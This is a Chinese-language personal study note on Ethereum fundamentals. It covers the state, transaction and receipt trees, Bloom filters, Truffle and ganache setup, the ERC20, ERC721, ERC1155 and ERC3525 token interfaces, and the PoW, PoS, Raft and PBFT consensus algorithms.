以太坊源码分析：[以太坊源码分析 - 知乎 (zhihu.com)](https://www.zhihu.com/column/c_1325775146926985216)



## 以太坊基础



### 以太坊区块头（PoW版本）

![image-20230424155147394](C:\Users\18390\AppData\Roaming\Typora\typora-user-images\image-20230424155147394.png)







### 以太坊-状态树-MPT（Merkle Patricia tree）



![image-20230422162725041](C:\Users\18390\AppData\Roaming\Typora\typora-user-images\image-20230422162725041.png)





### 交易树和收据树

每次发布区块，区块中的交易会组织成一棵交易树，每个交易执行完成会产生一个收据，收据中记录交易的相关信息。

交易树和收据树的节点是一一对应的。之所以增加收据树，是因为以太坊智能合约执行较为复杂，通过增加收据树便于快速查询执行结果。



**交易树和收据树的数据结构**：采用MPT，好处：支持查找，通过键值沿着树查找即可。状态树的键是账户地址，而交易树和收据树的键值为交易在发布区块中的序号，序号是由发布区块节点决定的。





**交易树和收据树的作用**：提供Merkle proof 和 更复杂的查找操作（如：查找过去十天与某个智能合约有关的交易）



**Bloom filter**：作用是支持较为高效地查找某个元素是否在某个比较大的集合中，Bloom filter 思想：给一个大的集合，计算出一个非常紧凑的“摘要”。

![image-20230424155700764](C:\Users\18390\AppData\Roaming\Typora\typora-user-images\image-20230424155700764.png)





**ETH中的Bloom filter的作用**：

​	区块中的每个交易执行完之后会形成一个包含Bloom filter的收据，Bloom Filter用于记录交易的类型、地址等信息。发布区块的块头中包含了一个总的Bloom filter，是一个区块里所有交易的一个Bloom filter的并集。

​	比如，要查找过去十天与智能合约发生的相关交易，通过查看块头中的Bloom Filter中是否包含该交易类型。如果包含，继续查找这个区块所包含的交易的收据树中的Bloom filter。如果仍存在，再查看交易进行确认。如果不存在，则说明发生了“碰撞”。

​	通过Bloom filter结构，可以快速过滤大量无关区块，从而提高了查找效率。





### Ghost协议

由于以太坊的出块实时间为15s左右，而由于网络延迟等原因，可能同一时刻出现多个合法区块，没有成为最长合法连上的区块称为叔父区块。

**叔父区块奖励**：

![image-20230424191744795](C:\Users\18390\AppData\Roaming\Typora\typora-user-images\image-20230424191744795.png)















## Truffle框架

![image-20230426163335358](C:\Users\18390\AppData\Roaming\Typora\typora-user-images\image-20230426163335358.png)



```
第一步：安装truffle
npm install -g truffle

第二步：下载box，这是一个模板示例。 注意：在空文件夹中执行该语句，否则会报错
tuffle unbox webpack

第三步：运行development console,这会在本地新建一条开发测试链
truffle develop

第四步：编译智能合约
truffle complie

第五步：将编译好的合约部署到链上
truffle migrate

第六步：启动web前端（另开一个窗口）
npm run dev

```















## web3.js









## Hardhat框架















# smart contract

## ERC20



**如何判断一个token合约是否为标准的ERC20合约？**

​	只要包含ERC20接口中规定的所有内容，就是标准的ERC20合约。至于方法内的逻辑是如何实现的，不做判断。



标准ERC20接口：

+ 3个查询：
  + `balanceOf`：查询指定地址的token数量
  + `totalSupply`：查询当前合约的token总量
  + `allowance`：查询指定地址对另一个地址的剩余授权额度
+ 2个交易
  + `transfer`：从当前调用者地址发送指定数量的token到指定的地址
    + 这是一个写入方法，所以还会抛出一个`Transfer`事件
  + `transferFrom`：当向另一个合约地址存款时，对方合约必须调用`transferFrom`才可以把token拿到自己的合约中
+ 2个事件
  + `Transfer`
  + `Approval`
+ 1个授权
  + `approve`：授权指定地址可以操作调用者的最大token数量。



**ERC20标准接口：**

```solidity
//SPDX-License-Identifier:MIT

pragma solidity ^0.8.19;

interface IERC20{
	
	//1个授权
	//授权指定地址可以操作调用者的最大token数量。
	function approve(address spender,uint256 amount)external returns(bool);
	
	//2个事件
	event Transfer(address indexed from,address indexed to,uin256 amount);
	event Approval(address indexed owner,address indexed spender,uint256 amount);
	
	
	//2个交易
	
	//从当前调用者地址发送指定数量的token到指定的地址
	function transfer(address recipient,uint256 amount)external returns(bool);
	//当向另一个合约地址存款时，对方合约必须调用`transferFrom`才可以把token拿到自己的合约中
	function transferFrom(address sender,address recipient,uint256 amount)external returns(bool);
	
	
	
	//3个查询
	 
	//查询当前合约的token总量
	function totalSupply()external view returns(uint256);
	//查询指定地址的token数量
	function balanceOf(address account)external view returns(uint256);
	//查询指定地址对另一个地址的剩余授权额度
	function allowance(address owner,address spender)external view returns(uint256);
}
```





**ERC20标准接口实现：**

```solidity
//SPDX-License-Identifier:MIT

pragma solidity ^0.8.19;

interface IERC20{

	function approve(address spender,uint256 amount)external returns(bool);

	event Transfer(address indexed from,address indexed to,uin256 amount);
	event Approval(address indexed owner,address indexed spender,uint256 amount);
	
	function transfer(address recipient,uint256 amount)external returns(bool);
	function transferFrom(address sender,address recipient,uint256 amount)external returns(bool);
	
	function totalSupply()external view returns(uint256);
	function balanceOf(address account)external view returns(uint256);
	function allowance(address owner,address spender)external view returns(uint256);
}


contract ERC20 is IERC20{
	//状态变量
	string public name;
	string public symbol;
	uint8 public immutable decimals;  //token的精度，例如可以定为18位小数
	
	address public immutable owner;
	
	uint256 public totalSupply;  //总价总量
	mapping(address=>uint256) public balanceOf;
	//批准的映射，一个地址批准另一个地址的额度
	mapping(address=>mapping(address=>uint256)) public allowance;
	
	
	modifier onlyOwner(){
		require(msg.sender == owner,"not owner");
		_;
	}
	
	constructor(string memroy _name,string memory _symbol,uint8 _decimals,uint256 _totalSupply){
		owner = msg.sender;
		name = _name;
		decimals = _decimals;
		totalSupply = _totalSupply;
		balanceOf[msg.sender] = _totalSupply;
		emit Transfer(address(0),msg.sender,_totalSupply);
	}
	
	////spender表示被授权账户
	function approve(address spender,uint256 amount)external returns(bool){
		allowance[msg.sender][spender] = amount;  //设置额度
		emit Approval(msg.sender,spender,amount);
		return true;
	}
	
	
	function transfer(address recipient,uint256 amount)external returns(bool){
		balanceOf[msg.sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(msg.sender,recipient,amount);
        return true;
	}
	
	
	function transferFrom(address sender,address recipient,uint256 amount)external returns(bool){
		allowance[sender][msg.sender] -= amount;
		balanceOf[sender] -= amount;
		balanceOf[recipient] += amount;
		emit Transfer(sender,recipient,amount);
		return true;
		
	}
	
	//1个铸币,非必须
	function mint(uint256 amount)external onlyOwner returns(bool){
		totalSupply += amount;
		balanceOf[msg.sender] += amount;
		emit Transfer(address(0),msg.sender,amount);
		return true;
	}
	
	//1个销毁，非必须
	function burn(uint256 amount)external returns(bool){
		totalSupply -= amount;
		balanceOf[msg.sender] -= amount;
		emit Transfer(msg.sender,address(0),amount);
		return true;
	}
	
	//转移owner权限等其他一些操作均是看各自业务需求，非必须
}
```











## ERC721

**参考资料:**

- https://eips.ethereum.org/EIPS/eip-721
- https://ethereum.org/zh/developers/docs/standards/tokens/erc-721/



**场景说明：**

非同质化代币（NFT）用于以唯一的方式标识某人或者某物。 此类型的代币可以被完美地用于出售下列物品的平台：收藏品、密钥、彩票、音乐会座位编号、体育比赛等。 这种类型的代币有着惊人的潜力，因此它需要一个适当的标准。ERC-721 就是为解决这个问题而来！

所有 NFTs 都有一个 `uint256` 变量，名为 `tokenId`，所以对于任何 ERC-721 合约，这对值 `contract address, tokenId` 必须是全局唯一的。 也就是说，去中心化应用程序可以有一个“转换器”， 使用 tokenId 作为输入并输出一些很酷的事物图像，例如僵尸、武器、技能或神奇的小猫咪！



```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

/**
 * @dev ERC165 标准的接口 https://eips.ethereum.org/EIPS/eip-165
 * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified
 */
interface IERC165 {
    /// @notice 查询合约是否实现接口
    /// @param interfaceID ERC-165 中指定的接口标识符
    /// @dev 接口标识在 ERC-165 中指定。此功能需要低于 30,000 gas。
    /// @return 如果合约实现了 interfaceID 且 interfaceID 不是 0xffffffff，则为 true，否则为 false
    function supportsInterface(bytes4 interfaceID) external view returns (bool);
}

/// @title ERC-721 Non-Fungible Token Standard
/// @dev See https://eips.ethereum.org/EIPS/eip-721
///  Note: the ERC-165 identifier for this interface is 0x80ac58cd.
interface IERC721 is IERC165 {
    /**
     @dev 当任何 NFT 的所有权通过任何形式发生变化时，需要触发该事件。
     当 NFT 创建（`from` == 0）和销毁（`to` == 0）时会触发此事件。
     例外情况：在合约创建期间，可以创建和分配任意数量的 NFT，而不会发出 Transfer。
     在任何形式的资产转移时，该 NFT如果有批准地址将重置为无。
    */
    event Transfer(
        address indexed _from,
        address indexed _to,
        uint256 indexed _tokenId
    );

    /**
     * 当 NFT 的批准地址被更改或重新确认时，它会发出。
     * 零地址表示没有批准的地址。
     * 当 Transfer 事件发出时，这也表明该 NFT 如果有批准地址被重置为无。
     */
    event Approval(
        address indexed _owner,
        address indexed _approved,
        uint256 indexed _tokenId
    );

    /// @dev 当为所有者启用或禁用操作员时，它会发出。 运营者可以管理所有者的所有 NFT。
    event ApprovalForAll(
        address indexed _owner,
        address indexed _operator,
        bool _approved
    );

    /// @notice 所有者的 NFT 数量
    /// @dev 分配给零地址的 NFT 被认为是无效的，并且该函数抛出有关零地址的查询。
    /// @param _owner 查询余额的地址
    /// @return `_owner` 拥有的 NFT 数量，可能为零
    function balanceOf(address _owner) external view returns (uint256);

    /// @notice 找到 NFT 的所有者
    /// @dev 分配给零地址的 NFT 被认为是无效的，并且对它们的查询确实会抛出异常。
    /// @param _tokenId NFT 的标识符
    /// @return NFT所有者的地址
    function ownerOf(uint256 _tokenId) external view returns (address);

    /// @notice 将 NFT 的所有权从一个地址转移到另一个地址
    /// @dev Throws unless `msg.sender` is the current owner, an authorized
    ///  operator, or the approved address for this NFT. Throws if `_from` is
    ///  not the current owner. Throws if `_to` is the zero address. Throws if
    ///  `_tokenId` is not a valid NFT. When transfer is complete, this function
    ///  checks if `_to` is a smart contract (code size > 0). If so, it calls
    ///  `onERC721Received` on `_to` and throws if the return value is not
    ///  `bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"))`.
    /// @param _from NFT的当前所有者
    /// @param _to 新 owner
    /// @param _tokenId 转移的 NFT
    /// @param data 没有指定格式的附加数据，在调用 _to 时发送
    function safeTransferFrom(
        address _from,
        address _to,
        uint256 _tokenId,
        bytes calldata data
    ) external payable;


    /// @notice 转移 NFT 的所有权——调用者有责任确认 `_to` 能够接收 NFTS，否则它们可能会永久丢失
    /// @dev Throws unless `msg.sender` is the current owner, an authorized
    ///  operator, or the approved address for this NFT. Throws if `_from` is
    ///  not the current owner. Throws if `_to` is the zero address. Throws if
    ///  `_tokenId` is not a valid NFT.
    /// @param _from NFT的当前所有者
    /// @param _to 新 owner
    /// @param _tokenId 转移的 NFT
    function transferFrom(
        address _from,
        address _to,
        uint256 _tokenId
    ) external payable;

    /// @notice 更改或重申 NFT 的批准地址
    /// @dev The zero address indicates there is no approved address.
    ///  Throws unless `msg.sender` is the current NFT owner, or an authorized
    ///  operator of the current owner.
    /// @param _approved 新批准的 NFT 控制器
    /// @param _tokenId NFT 批准
    function approve(address _approved, uint256 _tokenId) external payable;

    /// @notice 启用或禁用对第三方（“操作员”）的批准以管理所有 `msg.sender` 的资产
    /// @dev 发出 ApprovalForAll 事件。 合同必须允许每个所有者有多个操作员。
    /// @param _operator 添加到授权运营商集中的地址
    /// @param _approved 如果运营商获得批准，则为 True，如果撤消批准，则为 false
    function setApprovalForAll(address _operator, bool _approved) external;

    /// @notice 获取单个 NFT 的认可地址
    /// @dev 如果 _tokenId 不是有效的 NFT，则抛出。
    /// @param _tokenId NFT寻找批准的地址
    /// @return 此 NFT 的批准地址，如果没有则为零地址
    function getApproved(uint256 _tokenId) external view returns (address);

    /// @notice 查询一个地址是否是另一个地址的授权操作员
    /// @param _owner 拥有 NFT 的地址
    /// @param _operator 代表所有者的地址
    /// @return 如果 _operator 是 _owner 的批准运算符，则为真，否则为假
    function isApprovedForAll(address _owner, address _operator)
        external
        view
        returns (bool);
}
```











## ERC1155

**参考资料:**

- https://eips.ethereum.org/EIPS/eip-1155
- https://ethereum.org/zh/developers/docs/standards/tokens/erc-1155/



**场景说明：**

用于多种代币管理的合约标准接口。单个部署的合约可以包括同质化代币、非同质化代币或其他配置（如半同质化代币）的任何组合。

它的目的很单纯，就是创建一个智能合约接口，可以代表和控制任何数量的同质化和非同质化代币类型。 这样一来，ERC-1155 代币就具有与 ERC-20 和 ERC-721 代币相同的功能，甚至可以同时使用这两者的功能。 而最重要的是，它能改善这两种标准的功能，使其更有效率，并纠正 ERC-20 和 ERC-721 标准上明显的实施错误。





```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

/**
 * @dev ERC165 标准的接口 https://eips.ethereum.org/EIPS/eip-165
 * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified
 */
interface IERC165 {
    /// @notice 查询合约是否实现接口
    /// @param interfaceID ERC-165 中指定的接口标识符
    /// @dev 接口标识在 ERC-165 中指定。此功能需要低于 30,000 gas。
    /// @return 如果合约实现了 interfaceID 且 interfaceID 不是 0xffffffff，则为 true，否则为 false
    function supportsInterface(bytes4 interfaceID) external view returns (bool);
}

/**
    @title ERC-1155 Multi Token Standard
    @dev See https://eips.ethereum.org/EIPS/eip-1155
    Note: The ERC-165 identifier for this interface is 0xd9b67a26.
 */
interface IERC1155 is IERC165 {
    /**
        @dev Either `TransferSingle` or `TransferBatch` MUST emit when tokens are transferred,
        including zero value transfers as well as minting or burning (see "Safe Transfer Rules" section of 		   the standard).
        The `_operator` argument MUST be the address of an account/contract that is approved to make the 		 transfer (SHOULD be msg.sender).
        The `_from` argument MUST be the address of the holder whose balance is decreased.
        The `_to` argument MUST be the address of the recipient whose balance is increased.
        The `_id` argument MUST be the token type being transferred.
        The `_value` argument MUST be the number of tokens the holder balance is decreased by and match 		what the recipient balance is increased by.
        When minting/creating tokens, the `_from` argument MUST be set to `0x0` (i.e. zero address).
        When burning/destroying tokens, the `_to` argument MUST be set to `0x0` (i.e. zero address).
    */
    event TransferSingle(
        address indexed _operator,
        address indexed _from,
        address indexed _to,
        uint256 _id,
        uint256 _value
    );

    /**
        @dev Either `TransferSingle` or `TransferBatch` MUST emit when tokens are transferred,
        including zero value transfers as well as minting or burning (see "Safe Transfer Rules" section of 		   the standard).
        The `_operator` argument MUST be the address of an account/contract that is approved to make the 		 transfer (SHOULD be msg.sender).
        The `_from` argument MUST be the address of the holder whose balance is decreased.
        The `_to` argument MUST be the address of the recipient whose balance is increased.
        The `_ids` argument MUST be the list of tokens being transferred.
        The `_values` argument MUST be the list of number of tokens (matching the list and order of tokens 		   specified in _ids)
        the holder balance is decreased by and match what the recipient balance is increased by.
        When minting/creating tokens, the `_from` argument MUST be set to `0x0` (i.e. zero address).
        When burning/destroying tokens, the `_to` argument MUST be set to `0x0` (i.e. zero address).
    */
    event TransferBatch(
        address indexed _operator,
        address indexed _from,
        address indexed _to,
        uint256[] _ids,
        uint256[] _values
    );

    /**
        @dev 必须在批准第二方/运营商地址管理所有者地址的所有令牌时启用或禁用（没有事件假定禁用）
    */
    event ApprovalForAll(
        address indexed _owner,
        address indexed _operator,
        bool _approved
    );

    /**
        @dev 必须在为令牌 ID 更新 URI 时发出。
        URI 在 RFC 3986 中定义。
        URI 必须指向符合“ERC-1155 元数据 URI JSON 模式”的 JSON 文件。
    */
    event URI(string _value, uint256 indexed _id);

    /**
        @notice Transfers `_value` amount of an `_id` from the `_from` address
                to the `_to` address specified (with safety call).
        @dev Caller must be approved to manage the tokens being transferred
        out of the `_from` account (see "Approval" section of the standard).
        MUST revert if `_to` is the zero address.
        MUST revert if balance of holder for token `_id` is lower than the `_value` sent.
        MUST revert on any other error.
        MUST emit the `TransferSingle` event to reflect the balance change (see "Safe Transfer Rules" 			section of the standard).
        After the above conditions are met, this function MUST check if `_to` is a smart contract (e.g. 		code size > 0). If so,
        it MUST call `onERC1155Received` on `_to` and act appropriately (see "Safe Transfer Rules" section 			of the standard).
        @param _from    Source address
        @param _to      Target address
        @param _id      ID of the token type
        @param _value   Transfer amount
        @param _data    Additional data with no specified format, MUST be sent unaltered in call to 			`onERC1155Received` on `_to`
    */
    function safeTransferFrom(
        address _from,
        address _to,
        uint256 _id,
        uint256 _value,
        bytes calldata _data
    ) external;

    /**
        @notice 将 `_ids` 的 `_values` 数量从 `_from` 地址转移到指定的 `_to` 地址（使用安全调用）。
        @dev Caller must be approved to manage the tokens being transferred out of the `_from` account 			(see "Approval" section of the standard).
        MUST revert if `_to` is the zero address.
        MUST revert if length of `_ids` is not the same as length of `_values`.
        MUST revert if any of the balance(s) of the holder(s) for token(s) in `_ids` is lower than the 			respective amount(s) in `_values` sent to the recipient.
        MUST revert on any other error.
        MUST emit `TransferSingle` or `TransferBatch` event(s) such that all the balance changes are 			reflected (see "Safe Transfer Rules" section of the standard).
        Balance changes and events MUST follow the ordering of the arrays (_ids[0]/_values[0] before 			_ids[1]/_values[1], etc).
        After the above conditions for the transfer(s) in the batch are met, this function MUST check if 		`_to` is a smart contract (e.g. code size > 0). If so,
        it MUST call the relevant `ERC1155TokenReceiver` hook(s) on `_to` and act appropriately (see "Safe 			Transfer Rules" section of the standard).
        @param _from    Source address
        @param _to      Target address
        @param _ids     每个令牌类型的 ID（顺序和长度必须匹配 _values 数组）
        @param _values  每种代币类型的转账金额（顺序和长度必须匹配 _ids 数组）
        @param _data    没有指定格式的额外数据，必须在调用 _to 上的 `ERC1155TokenReceiver` 钩子时原封不动地发送
    */
    function safeBatchTransferFrom(
        address _from,
        address _to,
        uint256[] calldata _ids,
        uint256[] calldata _values,
        bytes calldata _data
    ) external;

    /**
        @notice 获取帐户令牌的余额。
        @param _owner  令牌持有者的地址
        @param _id     ID of the token
        @return        请求的代币类型的所有者余额
     */
    function balanceOf(address _owner, uint256 _id)
        external
        view
        returns (uint256);

    /**
        @notice 获取多个账户/代币对的余额
        @param _owners 代币持有者的地址
        @param _ids    ID of the tokens
        @return        请求的令牌类型的 _owner 余额（即每个 (owner, id) 对的余额）
     */
    function balanceOfBatch(address[] calldata _owners, uint256[] calldata _ids)
        external
        view
        returns (uint256[] memory);

    /**
        @notice 启用或禁用对第三方（“操作员”）的批准以管理所有调用者的令牌。
        @dev 必须在成功时发出 ApprovalForAll 事件。
        @param _operator  添加到授权运营商集中的地址
        @param _approved  如果运营商获得批准，则为 True，如果撤消批准，则为 false
    */
    function setApprovalForAll(address _operator, bool _approved) external;

    /**
        @notice 查询给定所有者的操作员的批准状态。
        @param _owner     The owner of the tokens
        @param _operator  授权操作员的地址
        @return           如果操作员被批准则为真，否则为假
    */
    function isApprovedForAll(address _owner, address _operator)
        external
        view
        returns (bool);
}
```







## ERC3525

每个符合 EIP-3525 的合约都必须实现 EIP-3525、EIP-721 和 EIP-165 接口



**参考资料:**

- https://eips.ethereum.org/EIPS/eip-3525





**场景说明：**描述一组具有相同类型，但是有轻微不同的东西。比如相同的 100 元人民币，一共 100 张，每一张都是价值 100 的纸币，大部分的防伪等等都不同，但是每一张都编号都不同。



```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title EIP-3525 Semi-Fungible Token Standard
 * Note: the EIP-165 identifier for this interface is 0xd5358140.
 */

interface IERC3525  /* is IERC165, IERC721 */ {
    /**
     * @dev MUST emit when value of a token is transferred to another token with the same slot,
     *  including zero value transfers (_value == 0) as well as transfers when tokens are created
     *  (`_fromTokenId` == 0) or destroyed (`_toTokenId` == 0).
     * @param _fromTokenId The token id to transfer value from
     * @param _toTokenId The token id to transfer value to
     * @param _value The transferred value
     */
    event TransferValue(
        uint256 indexed _fromTokenId,
        uint256 indexed _toTokenId,
        uint256 _value
    );

    /**
     * @dev MUST emit when the approval value of a token is set or changed.
     * @param _tokenId The token to approve
     * @param _operator The operator to approve for
     * @param _value The maximum value that `_operator` is allowed to manage
     */
    event ApprovalValue(
        uint256 indexed _tokenId,
        address indexed _operator,
        uint256 _value
    );

    /**
     * @dev MUST emit when the slot of a token is set or changed.
     * @param _tokenId The token of which slot is set or changed
     * @param _oldSlot The previous slot of the token
     * @param _newSlot The updated slot of the token
     */
    event SlotChanged(
        uint256 indexed _tokenId,
        uint256 indexed _oldSlot,
        uint256 indexed _newSlot
    );

    /**
     * @notice Get the number of decimals the token uses for value - e.g. 6, means the user
     *  representation of the value of a token can be calculated by dividing it by 1,000,000.
     *  Considering the compatibility with third-party wallets, this function is defined as
     *  `valueDecimals()` instead of `decimals()` to avoid conflict with EIP-20 tokens.
     * @return The number of decimals for value
     */
    function valueDecimals() external view returns (uint8);

    /**
     * @notice Get the value of a token.
     * @param _tokenId The token for which to query the balance
     * @return The value of `_tokenId`
     */
    function balanceOf(uint256 _tokenId) external view returns (uint256);

    /**
     * @notice Get the slot of a token.
     * @param _tokenId The identifier for a token
     * @return The slot of the token
     */
    function slotOf(uint256 _tokenId) external view returns (uint256);

    /**
     * @notice Allow an operator to manage the value of a token, up to the `_value`.
     * @dev MUST revert unless caller is the current owner, an authorized operator, or the approved
     *  address for `_tokenId`.
     *  MUST emit the ApprovalValue event.
     * @param _tokenId The token to approve
     * @param _operator The operator to be approved
     * @param _value The maximum value of `_toTokenId` that `_operator` is allowed to manage
     */
    function approve(
        uint256 _tokenId,
        address _operator,
        uint256 _value
    ) external payable;

    /**
     * @notice Get the maximum value of a token that an operator is allowed to manage.
     * @param _tokenId The token for which to query the allowance
     * @param _operator The address of an operator
     * @return The current approval value of `_tokenId` that `_operator` is allowed to manage
     */
    function allowance(uint256 _tokenId, address _operator)
        external
        view
        returns (uint256);

    /**
     * @notice Transfer value from a specified token to another specified token with the same slot.
     * @dev Caller MUST be the current owner, an authorized operator or an operator who has been
     *  approved the whole `_fromTokenId` or part of it.
     *  MUST revert if `_fromTokenId` or `_toTokenId` is zero token id or does not exist.
     *  MUST revert if slots of `_fromTokenId` and `_toTokenId` do not match.
     *  MUST revert if `_value` exceeds the balance of `_fromTokenId` or its allowance to the
     *  operator.
     *  MUST emit `TransferValue` event.
     * @param _fromTokenId The token to transfer value from
     * @param _toTokenId The token to transfer value to
     * @param _value The transferred value
     */
    function transferFrom(
        uint256 _fromTokenId,
        uint256 _toTokenId,
        uint256 _value
    ) external payable;

    /**
     * @notice 转移将指定数量的代币到新地址。调用者应确认 _to 能够接收 EIP-3525 资产。
     * @dev This function MUST create a new EIP-3525 token with the same slot for `_to`,
     *  or find an existing token with the same slot owned by `_to`, to receive the transferred value.
     *  MUST revert if `_fromTokenId` is zero token id or does not exist.
     *  MUST revert if `_to` is zero address.
     *  MUST revert if `_value` exceeds the balance of `_fromTokenId` or its allowance to the
     *  operator.
     *  MUST emit `Transfer` and `TransferValue` events.
     * @param _fromTokenId The token to transfer value from
     * @param _to The address to transfer value to
     * @param _value The transferred value
     * @return ID of the token which receives the transferred value
     */
    function transferFrom(
        uint256 _fromTokenId,
        address _to,
        uint256 _value
    ) external payable returns (uint256);
}
```

更多关于 3525 协议的内容，参考 https://cloud.tencent.com/developer/article/2155201











# openzeppelin

OpenZeppelin Contracts 是一个**用于安全智能合约开发的库**。**它提供了 ERC20 和 ERC721 等标准的实现**，您可以按需部署或扩展以满足您的需求，还提供 [Solidity](https://so.csdn.net/so/search?q=Solidity&spm=1001.2101.3001.7020) 组件来构建自定义合同和更复杂的分散系统。









[OpenZeppelin 7个最常使用的合约 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/142240709)







# IPFS













# NFT









# DeFi









#  GameFi











# Dao











# 以太坊DAPP



**Dapp开发环境：**

+ geth + js
+ ganache + js
+ truffle





## geth + js

**安装geth：**

[(35条消息) Geth开发环境搭建（Centos7）_geth环境变量_瘦身小蚂蚁的博客-CSDN博客](https://blog.csdn.net/ling1998/article/details/123694539)



**生成私链：**

[(35条消息) Geth-1.10.16 私链搭建_geth创建私链_瘦身小蚂蚁的博客-CSDN博客](https://blog.csdn.net/ling1998/article/details/123725616)





## ganache + js

**注意：ganache是在内存中模拟一个区块链**



```shell
# 第一步，安装命令行ganache-cli
npm install -g ganache-cli
	# 安装完成后，就可以启动ganache-cli，端口号为8545


# 第二步，安装express
npm install -g express-generator 
npm install -g express


# 第三步，创建一个文件夹Dapp，在该文件夹中创建工程
express -e MyDapp
cd MyDapp
npm install
npm start    # 这里可以通过访问 http://localhost:3000

# 第四步，在MyDapp文件夹中安装web3，和区块链交互
npm install web3 -save
```





## 智能合约调用



![image-20230505132029978](C:\Users\18390\AppData\Roaming\Typora\typora-user-images\image-20230505132029978.png)







# 共识算法

## PoW

在区块链中，工作量证明（PoW）是通过找到一个nonce值，使得新区块头的哈希值小于某个指定的值，即区块头结构中的“难度目标”。



## PoS

权益证明机制的原理：要求用户证明自己拥有一定数量的数字货币的所有权，即“权益 ”。



PoS共识算法主要解决PoW中资源浪费问题。PoS要求参与者预先存放一定数量的代币在区块链上，同时引入奖惩机制。



```solidity
hash(block_header) <= target*coinage
//币龄计算：coinage=币的个数 * 币的剩余使用时间
```





**PoS共识算法借鉴代码：[(35条消息) 这可能是全网最简单的POS共识机制算法_pos共识算法_ReignsDu的博客-CSDN博客**](https://blog.csdn.net/reigns_/article/details/103058257)







## Raft







follower节点具有两个倒计时

+ 竞选倒计时，一般是在150ms~300ms的随机数，如果超时，该节点会成为candidate开始一个新的任期term（任期是递增的），然后其他节点发送竞选投票，其他节点收到竞选投票后，follower会重置竞选倒计时（即已经有人来竞选了），发现term大于节点中的term，然后会在新term下进行投票，每个节点只有一票。
+ 心跳倒计时，远小于竞选倒计时，周期性心跳，周期性发送appendEntries，如果存在日志条目就是要求follower进行日志复制，如果为空则相当于心跳的作用



raft共识算法演示动画：[Raft (thesecretlivesofdata.com)](https://thesecretlivesofdata.com/raft/)

raft共识算法讲解视频：https://www.bilibili.com/video/BV1Wy4y1K7zF/?spm_id_from=333.1007.top_right_bar_window_history.content.click







## PBFT

实用拜占庭容错算法（PBFT），该算法适用于联盟链，在链中恶意节点数不能超过1/3情况下，该算法能够同时保证安全性和活性。

PBFT首次将拜占庭容错算法复杂度从指数级降低到多项式级$O(N^2)$



### 与公链共识算法的区别

+ 在公链中，每一个区块串行进行共识，共识的对象是区块，区块内包含了一段时间收集的交易
+ 在pbft中，共识的对象是每一个交易（可以说在pbft中没有区块这个概念），交易共识的工程是并行。



### PBFT适用场景

+ PBFT在网络不稳定的情况下延迟很高
+ 基于投票的，所以投票集合是有限的
+ **通信复杂度是$O(N^2)$** ，可拓展性较低，**一般系统在达到100左右的节点时性能下降的非常快**





### PBFT共识过程

![image-20230519153151082](C:\Users\18390\AppData\Roaming\Typora\typora-user-images\image-20230519153151082.png)



1. 客户端c在时间为t发送请求给主节点，要求执行操作o;

2. Pre-prepare阶段：主节点0对请求分配序列号，完成排序后将请求广播给所有的副节点;

3. prepare阶段：副节点i验证在接受到主节点的请求后，需要验证请求和序列号在当前的视图中是否有效，将投票结果发给其他节点;

4. commit阶段：每个节点在收到超过2f个副节点的投票信息之后，如果请求、序列号和视图均匹配，则生成一个提交信息发送给其他节点，表明接收了对应的请求;

5. 每个节点在收到超过f+1个节点的提交信息后，将请求的发起时间t、请求的执行结果r和当前的视图号v发送给客户端 c;

6. 客户端在接受执行结果r之前，需要阻塞等待f+1个节点的响应，要求各个副本节点i对于客户端c的请求的响应中的签名必须有效，同时这些响应中的各个结果r以及请求的时间戳t需要相同。

如果客户端超时没有收到响应，客户端会广播请求给系统中的所有节点。节点接收到重复的请求的时候，如果已经处理过该请求的话，那么会将响应再次发送给客户端。同时，副本会记录下自己最近一次发送给客户端的响应消息。此外，如果节点不是主节点的话，需要把请求转发给主节点。如果主节点不将请求广播给副节点，当有足够的副节点怀疑主节点是作恶节点的时候， 亦会引发视图变更，将主节点替换掉。



==注意：pre-prepare阶段和prepare阶段是用于同一个视图内保证请求的顺序一致，commit阶段是用于保证跨视图（主节点切换）的请求顺序一致。即，如果没有视图切换，pre-prepare阶段和prepare阶段已经能够保证顺序一致。commit阶段是用于与view-change配合，保证上一视图中执行的请求，可以在新视图中重放，并且编号也为n，保证了跨视图请求顺序的一致性。==

**[为什么PBFT协议中需要Commit阶段_pbft 提交阶段的作用_seafooler的博客-CSDN博客](https://blog.csdn.net/u014633283/article/details/112506761)**





#### pre-prepare阶段

主节点在收到客户端的请求后，会基于当前的视图v对请求分配编号n，将视图号v、请求序列号n、请求摘要d、签名封装成pre-prepare消息，记录到本地的消息日志中，然后将pre-prepare消息连同客户端原始请求m发送给其他的副节点，同时追加到自己的消息日志中。**注意，pre-prepare消息中，是不包含客户端原本的请求消息m的，而只是包含了该请求的摘要而已**。pre-prepare阶段主要是用来对请求进行绝对排序，将请求传输和请求排序进行解耦，同时还可以证明在视图变更协议中，主节点在视点为v的时候把请求编号为n。

![image-20230519155301104](C:\Users\18390\AppData\Roaming\Typora\typora-user-images\image-20230519155301104.png)



![image-20230519155425023](C:\Users\18390\AppData\Roaming\Typora\typora-user-images\image-20230519155425023.png)





#### prepare阶段

每个副节点在上一个阶段验证主节点的pre-prepare消息有效之后，会进入到 prepare 阶段，生成一个prepare消息记录到本地，表明自己已经接受了主节点的提议，**同意在视图v中把序列号n分配给了客户端请求**，保证自己在这个视图中不会再将序列号分配给其他的客户端请求，然后把prepare消息发送给其他节点。

![image-20230519155608944](C:\Users\18390\AppData\Roaming\Typora\typora-user-images\image-20230519155608944.png)

![image-20230519155709550](C:\Users\18390\AppData\Roaming\Typora\typora-user-images\image-20230519155709550.png)





#### commit阶段

当各个节点做好准备之后，即本地消息日志中记录了摘要为d的请求m、记录了主节点对请求m进行排序的pre-prepare消息，同时接收到了超过2f个其他节点发过来的有效的prepare消息，各个节点会进入下一个阶段，即commit阶段。各个节点会生成一个视图为v、请求序列号为n、请求摘要为D(m)的commit消息追加到本地消息日志文件中，同时广播给系统内的其他节点。

![image-20230519155933585](C:\Users\18390\AppData\Roaming\Typora\typora-user-images\image-20230519155933585.png)

![image-20230519161015465](C:\Users\18390\AppData\Roaming\Typora\typora-user-images\image-20230519161015465.png)

